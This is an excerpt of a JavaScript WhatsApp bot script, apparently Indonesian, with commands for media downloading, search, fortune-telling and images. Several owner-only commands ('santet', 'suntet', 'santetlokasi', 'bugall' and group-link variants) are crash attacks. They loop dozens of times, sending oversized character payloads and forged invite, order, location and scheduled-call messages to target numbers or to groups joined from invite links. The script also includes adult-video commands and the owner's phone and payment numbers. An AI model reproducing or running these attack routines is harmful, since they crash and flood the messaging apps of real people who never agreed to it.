...
const qris = fs.readFileSync ('./baseikal/image/qris.jpg')
...
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
Creator : https://wa.me/6283872588911`})
...
const reply = (teks) => {
return haikal.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `DEVELOPER ${botname}`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": 'https://telegra.ph/file/297a0ffd35ca495c710b0.jpg',"thumbnail": thumb,"sourceUrl": `https://ptero.rainxzet.com/s1`}}}, { quoted:m})} 
...
async function sendGeekzMessage(chatId, message, options = {}){
    ...
    return haikal.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

const sendapk = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
m.reply('*Rusak Bodoh !! Yang Bener Contoh : Yoapk ${botname}*')
}
...
m.reply('*Rusak Bodoh !! Yang Bener Contoh : Yozip ${botname}*')
}
...
m.reply('*Rusak Bodoh !! Yang Bener Contoh : Yopdf ${botname}*')
}
...
❏ Santettroli 628xxx
❏ Santetinvite 628xx
❏ Crashgc (Link Group Nya)
❏ Tahugc (Link Group Nya)
❏ Santetgctroli (Link Group Nya)
❏ Buginvitegc (Link Group Nya)
...
${prefix} igimage (linknya)
${prefix} instagram (linknya)
...
${prefix} ytsearch (masukan judul)
${prefix} ytreels (linknya)
${prefix} getmusic (reply hasil ytsearch)
${prefix} getvideo (reply hasil ytsearch)`)
}
break
//=================================================//
case 'randommenu': {
...
case 'pengguna':  {
if (!isCreator) return m.reply('*khusus Premium*')
if (!args[0]) return reply(`*Contoh : ${command} add 6285263390832*`)
if (args[1]) {
...
reply(`Wait 1-24 Jam an untuk proses banned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan ALBYS🥺🙏`)
...
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan ALBYS🥺🙏`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##
...
haikal.relayMessage(m.chat, { scheduledCallCreationMessage: { callType: "2", scheduledTimestampMs: Date.now, title: cap}},{ messageId: scheduledCallCreationMessage })
...
case "santet":
if (!isCreator) return m.reply('*Gak Boleh Kak  Jangan Nakal😉*')
        for (let jumbo = 0; jumbo < 80; jumbo++) {
          ...
          haikal.relayMessage(m.chat, kontol, {
            'participant': {
              'jid': m.chat
            }
          });
          ...
          haikal.sendMessage(m.chat, bajing, wasu);
          await sleep(200);
          const mekih = {
          ...
          haikal.sendMessage(m.chat, mekih, ahco);
          await sleep(200);
          const babuk = {
            fromMe: false,
          ...
          haikal.relayMessage(m.chat, konstol, {
            'participant': {
              'jid': m.chat
            }
          });
...
haikal.relayMessage(from, locationMessage.message, { messageId: locationMessage.key.id })
}
}
case 'suntet':
{
...
haikal.relayMessage(from, groupInviteMessage.message, { messageId: groupInviteMessage.key.id })
}
}
//===============================================
case "santetlokasi":{
...
haikal.relayMessage(Pshsisj, groupInviteMessage.message, { messageId: groupInviteMessage.key.id })
}
...
if (!isCreator) return m.reply('*Gak Boleh Kak  Jangan Nakal😉*')
        for (let jumbo = 0; jumbo < 80; jumbo++) {
          ...
          babuk.quotedMessage.listResponseMessage = {};
          babuk.quotedMessage.listResponseMessage.title = "WE ARE DEVELOPER ALBYS";
          babuk.forwardedNewsletterMessageInfo.newsletterJid = "120363264841198508@newsletter";
          babuk.forwardedNewsletterMessageInfo.newsletterName = "ALBYS";
          babuk.forwardedNewsletterMessageInfo.serverMessageId = 0x1;
          babuk.forwardedNewsletterMessageInfo.low = "1708726663";
          babuk.forwardedNewsletterMessageInfo.high = '0';
...
var groupInviteMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "120363262065845429@g.us",
"inviteCode": "/RwWifkIpEQUesVv",
"inviteExpiration": "1709614188",
"groupName": `${ngazap(prefix)}`,
"caption": "Halo Saya ALBYS"
...
haikal.relayMessage(hsjsjsksks, product.message, { messageId: product.key.id })
}
await sleep(2000)
}
...
let hsisksdndg = await haikal.groupAcceptInvite(result)
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
var product = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
...
haikal.relayMessage(hsisksdndg, product.message, { messageId: product.key.id })
}
await sleep(2000)
}
m.reply(`*Sukses mengirim Bug Ke ${Pe}*`)
...
haikal.relayMessage(Pesgwuw, groupInviteMessage.message, { messageId: groupInviteMessage.key.id })
}
m.reply(`Sukses Mengirim Bug`)
}
break
...
let result = args[0].split('https://chat.whatsapp.com/')[1]
let Pehssjsjsj = await haikal.groupAcceptInvite(result)
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
var groupInviteMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"groupInviteMessage": {
...
haikal.relayMessage(Pehssjsjsj, groupInviteMessage.message, { messageId: groupInviteMessage.key.id })
}
m.reply(`Sukses Mengirim Bug`)
}
break
...
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} Link\nContoh ${prefix+command} https://chat.whatsapp.com/FuLRVI2SGNd4bnWXklPsEt`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
let Peshsjsjs  = await haikal.groupAcceptInvite(result)
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
var locationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
	"locationMessage": {
...
haikal.relayMessage(Peshsjsjs, locationMessage.message, { messageId: locationMessage.key.id })
}
m.reply(`Sukses Mengirim Bug`)
}
break
...
Pscajae = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
        for (let jumbo = 0; jumbo < 80; jumbo++) {
          ...
          haikal.relayMessage(Pscajae, kontol, {
            'participant': {
              'jid': m.chat
            }
          });
          ...
          haikal.sendMessage(Pscajae, bajing, wasu);
          await sleep(200);
          const mekih = {
            text: "ASSALAMUALAIKUM 😈"
          };
          ...
          haikal.sendMessage(Pscajae, mekih, ahco);
          await sleep(200);
          const babuk = {
            fromMe: false,
            participant: "0@s.whatsapp.net",
          ...
          haikal.relayMessage(Pscajae, konstol, {
            'participant': {
              'jid': m.chat
            }
          });
...
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} Link\nContoh ${prefix+command} https://chat.whatsapp.com/FuLRVI2SGNd4bnWXklPsEt`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
let Psgsjjse = await haikal.groupAcceptInvite(result)
        for (let jumbo = 0; jumbo < 80; jumbo++) {
          const asu = '' + 'ྃ'.repeat(65000);
          const jancok = "🔥 ALBYS🔥" + asu;
          const memek = {
          ...
          haikal.relayMessage(Psgsjjse, kontol, {
            'participant': {
              'jid': m.chat
            }
          });
          ...
          haikal.sendMessage(Psgsjjse, bajing, wasu);
          await sleep(200);
          const mekih = {
            text: "ASSALAMUALAIKUM 😈"
          };
          ...
          haikal.sendMessage(Psgsjjse, mekih, ahco);
          await sleep(200);
          const babuk = {
            fromMe: false,
            participant: "0@s.whatsapp.net",
          ...
          haikal.relayMessage(Psgsjjse, konstol, {
            'participant': {
              'jid': m.chat
            }
          });
...
haikal.sendMessage(from, { video: joauuuuu, mimetype: 'video/mp4', caption: `APA ?? BERANI LIAT VIDEO INI GA ? AH LEMAH TAPI KHUSUS ANDROID 11 KEBAWAH DENG ` }, {quoted:m})
}
break
//=================================================
case "spam":
...
case 'assalamualaikum': case 'salam': {
...
for (let i of anu) {
await sleep(1500)
haikal.sendMessage(i, { image: { url:'https://telegra.ph/file/e8fa2a93e271cd0c2d05c.jpg'}, caption:`${text}`},{quoted:hw})
//haikal.sendMessage(i, {text: `${text}`}, {quoted:m})
    }
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
...
case 'larangan': case 'peraturan': {
 ...
 if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
haikal.sendMessage(from, { text : `Haii 👋 Aku ALBYS oli Bot ALBYS
...
case 'instagram': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
  ...
  for (const mediaData of mediaArray) {
    ...
    if (mediaType === 'video') {
      haikal.sendMessage(m.chat, {video: {url: mediaURL}, caption: cap}, {quoted: m})
    } else if (mediaType === 'image') {
      haikal.sendMessage(m.chat, { image: {url: mediaURL}, caption: cap}, {quoted: m})
    }
  }
}
break
...
${themeemoji} Title: ${result.title}`;
    ...
    haikal.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
...
case 'hentaivid': case 'hentai': case 'hentaivideo': {
                ...
                haikal.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
//=================================================//
// Textprome //
...
haikal.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/textprome/${command}?apikey=${apikey}&text=${text}` } })
break
//=================================================//
case 'sound1':
case 'sound2':
...
mediaType:  1,
mediaUrl: 'https://ptero.rainxzet.com/s1',
title: `${botname}`,
sourceUrl: `https://ptero.rainxzet.com/s1`, 
thumbnail: thumb
}
}})
break
...
if (!text) return reply(`*Example:* ${prefix + command} 165.282.18.191`)
 try {
 await sendSticker(nt)
 let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());
 await yogzzdevx.sendMessage(from, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude }},{ ephemeralExpiration: 604800 });
 } catch (e) { 
...
case 'atmin': case 'admin': {
 m.reply('https://wa.me/6283872588911 ig:@albyssz')
}
break
 //=================================================//
 case 'cecanindo':
 if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
ini_url = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=${apikey}&query=cecan indo`)
ini_url = ini_url.result
ini_buffer = await getBuffer(ini_url)
await haikal.sendImage(from, ini_buffer, 'Cecan Indo 😋', m)
break
//=================================================
case 'cecanjepang':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
ini_url = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=${apikey}&query=cecan jepang`)
ini_url = ini_url.result
ini_buffer = await getBuffer(ini_url)
await haikal.sendImage(from, ini_buffer, 'Cecan Jepang 😋', m)
break
//=================================================
case 'cecanmalaysia':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
ini_url = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=${apikey}&query=cecan malaysia`)
ini_url = ini_url.result
ini_buffer = await getBuffer(ini_url)
await haikal.sendImage(from, ini_buffer, 'Cecan Malaysia 😋', m)
break
//=================================================
case 'cecanhijaber':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
ini_url = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=${apikey}&query=cecan hijaber`)
ini_url = ini_url.result
ini_buffer = await getBuffer(ini_url)
await haikal.sendImage(from, ini_buffer, 'Cecan Hijab 😋', m)
break
//=================================================
case 'cecanchina':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
ini_url = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=${apikey}&query=cecan china`)
ini_url = ini_url.result
ini_buffer = await getBuffer(ini_url)
await haikal.sendImage(from, ini_buffer, 'Cecan China 😋', m)
break
//=================================================
case 'cecanvietnam':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
ini_url = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=${apikey}&query=cecan vietnam`)
ini_url = ini_url.result
ini_buffer = await getBuffer(ini_url)
await haikal.sendImage(from, ini_buffer, 'Cecan Vietnam 😋', m)
break
//=================================================
case 'cecankorea':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
ini_url = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=${apikey}&query=cecan korea`)
ini_url = ini_url.result
ini_buffer = await getBuffer(ini_url)
await haikal.sendImage(from, ini_buffer, 'Cecan Korea 😋', m)
break
//=================================================
case 'cecan':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
ini_url = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=${apikey}&query=cecan`)
ini_url = ini_url.result
ini_buffer = await getBuffer(ini_url)
await haikal.sendImage(from, ini_buffer, 'Cecan 😋', m)
break
//=================================================//
case 'art':
case 'awoo':
...
LayarKaca21(text).then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
...
case 'asupan1':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
require('./lib/tiktok').Tiktok('https://vt.tiktok.com/ZSFGd8FE8/').then( data => {
haikal.sendMessage(m.chat, { video: { url: data.nowm },caption:`¥ Ah Sayang 🤤`}, { quoted: m })
})
break
//=================================================//
case 'asupan2':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
require('./lib/tiktok').Tiktok('https://vt.tiktok.com/ZSFG2pY8X/').then( data => {
haikal.sendMessage(m.chat, { video: { url: data.nowm },caption:`¥ Ah Sayang 🤤`}, { quoted: m })
})
break
//=================================================//
case 'asupan3':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
require('./lib/tiktok').Tiktok('https://vt.tiktok.com/ZSFG2qtBK/').then( data => {
haikal.sendMessage(m.chat, { video: { url: data.nowm },caption:`¥ Ah Sayang 🤤`}, { quoted: m })
})
break
//=================================================//
case 'asupan4':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
require('./lib/tiktok').Tiktok('https://vt.tiktok.com/ZSFG2nt76/').then( data => {
haikal.sendMessage(m.chat, { video: { url: data.nowm },caption:`¥ Ah Sayang 🤤`}, { quoted: m })
})
break
//=================================================//
case 'asupan5':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
require('./lib/tiktok').Tiktok('https://vt.tiktok.com/ZSFG2xcHB/').then( data => {
haikal.sendMessage(m.chat, { video: { url: data.nowm },caption:`¥ Ah Sayang 🤤`}, { quoted: m })
})
break
//=================================================//
case 'asupan6':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
require('./lib/tiktok').Tiktok('https://vt.tiktok.com/ZSFG2X1Rm/').then( data => {
haikal.sendMessage(m.chat, { video: { url: data.nowm },caption:`¥ Ah Sayang 🤤`}, { quoted: m })
})
break
//=================================================//
case 'asupan7':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
require('./lib/tiktok').Tiktok('https://vt.tiktok.com/ZSFG2fntJ/').then( data => {
haikal.sendMessage(m.chat, { video: { url: data.nowm },caption:`¥ Ah Sayang 🤤`}, { quoted: m })
})
break
//=================================================//
case 'asupan8':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
require('./lib/tiktok').Tiktok('https://vt.tiktok.com/ZSFG2pbc8/').then( data => {
haikal.sendMessage(m.chat, { video: { url: data.nowm },caption:`¥ Ah Sayang 🤤`}, { quoted: m })
})
break
//=================================================//
case 'asupan9':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
require('./lib/tiktok').Tiktok('https://vt.tiktok.com/ZSFG2ygoF/').then( data => {
haikal.sendMessage(m.chat, { video: { url: data.nowm },caption:`¥ Ah Sayang 🤤`}, { quoted: m })
})
break
//=================================================//
case 'asupan10':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
require('./lib/tiktok').Tiktok('https://vt.tiktok.com/ZSFG2Pt4m/').then( data => {
haikal.sendMessage(m.chat, { video: { url: data.nowm },caption:`¥ Ah Sayang 🤤`}, { quoted: m })
})
break
//=================================================//
case 'asupan11':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
require('./lib/tiktok').Tiktok('https://vt.tiktok.com/ZSNPqr8yR/').then( data => {
haikal.sendMessage(m.chat, { video: { url: data.nowm },caption:`¥ Ah Sayang 🤤`}, { quoted: m })
})
break
//=================================================//
...
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 if (!text) throw `Example : ${prefix + command} ${botname}, 7, 7, 2005, Putri, 16, 11, 2004`
...
case 'artinama': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 if (!text) throw `Example : ${prefix + command} ${botname} Hw`
...
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 if (!text) throw `Example : ${prefix + command} ${botname}, 7, 7, 2005`
...
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 if (!text) throw `Example : ${prefix + command} ${botname}|Putri`
...
case 'fengshui': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 if (!text) throw `Example : ${prefix + command} ${botname}, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
...
case 'peruntungan': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 if (!text) throw `Example : ${prefix + command} ${botname}, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
...
teksoooo = `│\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf ${botname} + sambil reply pesan target* \n\n Contoh 2 : yopdf ${botname}`
m.reply(teksoooo)
}
break
//=================================================//
...
case 'hapusdb':
if (!isCreator) return m.reply('*Khusus Premium*')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285263390832@s.whatsapp.net`)
...
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 ...
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/361f59190a8536564b0b4.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lagu`},{quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
 }
...
case 'wkwk':
 ...
 haikal.sendMessage(m.chat, {audio: mum, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 break
 //=================================================//
 case 'payment': case 'nope': case 'donasi':
 haikal.sendMessage(m.chat, {image: qris, caption:`Dana 083872588911 
 Gopay 083872588911` }, {quoted:m})
 break
 //=================================================//
 case 'nowa': {
if (!isCreator) return
...
.`
closegc = text.replace(/[^0-9]/g, '')+'@g.us'
if (text) {
 haikal.relayMessage(closegc, {
scheduledCallCreationMessage: {
callType: "2",
...
title: jyahaha
 ...
 haikal.relayMessage(from, {
scheduledCallCreationMessage: {
callType: "2",
scheduledTimestampMs: Date.now(),
title: jyahaha
//TOLONG JANGAN RINEM TITLE BANG HARGAI PENCIPTA
}
}, {})
}
}
...
haikal.sendImage(from, ini_buffer, 'Success Coy', m)
break
//=================================================
case "bugall":
if (!isCreator) return m.reply('*Gak Boleh Kak  Jangan Nakal😉*')
